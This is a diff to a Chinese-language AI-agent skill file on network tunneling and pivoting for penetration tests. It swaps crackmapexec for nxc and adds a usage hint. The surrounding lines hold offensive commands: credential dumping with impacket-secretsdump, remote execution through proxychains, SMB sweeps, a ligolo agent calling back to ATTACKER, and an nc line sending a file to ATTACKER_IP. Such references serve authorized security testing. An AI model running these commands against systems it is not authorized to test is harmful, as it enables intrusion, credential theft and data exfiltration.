@@ -1,6 +1,7 @@
 ---
 name: 'tunneling-port-forwarding'
 description: '隧道和端口转发：chisel/ligolo-ng/ssh -D -R -L/socat relay/plink。多层网络必备。每个场景的完整命令。'
+whenToUse: '内网多层网络/端口转发/出站受限时：按决策树选 chisel/ligolo-ng/ssh 隧道方案。'
 metadata: { domain: network, tier: T1 }
 ---
 > 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
@@ -119,7 +120,7 @@ proxychains4 impacket-psexec domain/user:pass@172.16.1.10
 
 ```bash
 # === 创建 TUN 接口 (只需一次) ===
-sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip tuntap add user root mode tun ligolo
 sudo ip link set ligolo up
 
 # === 添加目标网络路由 ===
@@ -176,7 +177,7 @@ ligolo-ng » session 1            # 选择 session 1
 nmap -sT -p 80,443,445 10.10.10.0/24
 xfreerdp /v:10.10.10.50 /u:admin
 smbclient -L //10.10.10.10
-crackmapexec smb 10.10.10.0/24
+nxc smb 10.10.10.0/24
 ```
 
 ### 2.6 Ligolo-ng 故障排查
@@ -544,7 +545,7 @@ proxychains4 impacket-secretsdump domain/user:pass@172.16.1.10
 proxychains4 impacket-wmiexec domain/user:pass@172.16.1.10
 
 # CrackMapExec
-proxychains4 crackmapexec smb 172.16.1.0/24 -u user -p pass -d domain
+proxychains4 nxc smb 172.16.1.0/24 -u user -p pass -d domain
 
 # RDP / VNC
 proxychains4 xfreerdp /v:172.16.1.10 /u:admin /p:pass
@@ -607,7 +608,7 @@ proxychains4 wget http://172.16.1.10/file.txt
   边界:   ./agent -connect ATTACKER:11601 -ignore-cert
   攻击者: session 1 → start
           nmap -sT 172.16.1.0/24
-          crackmapexec smb 172.16.1.0/24
+          nxc smb 172.16.1.0/24
 
 方案 B：SSH -D + proxychains
   攻击者: ssh -D 1080 user@10.10.10.5
@@ -771,7 +772,7 @@ nc -w 3 ATTACKER_IP 9999 < file
 
 # ============ Ligolo-ng ==========
 # 透明代理（最强大）
-攻击者: sudo ip tuntap add user $(whoami) mode tun ligolo
+攻击者: sudo ip tuntap add user root mode tun ligolo
         sudo ip link set ligolo up
         sudo ip route add NET/SUBNET dev ligolo
         ./proxy -selfcert -laddr 0.0.0.0:11601
@@ -796,7 +797,7 @@ socat TCP-LISTEN:PORT,fork TCP:TARGET:PORT
 
 # ============ Proxychains ============
 proxychains4 nmap -sT -Pn TARGET
-proxychains4 crackmapexec smb TARGET
+proxychains4 nxc smb TARGET
 ```
 
 ---
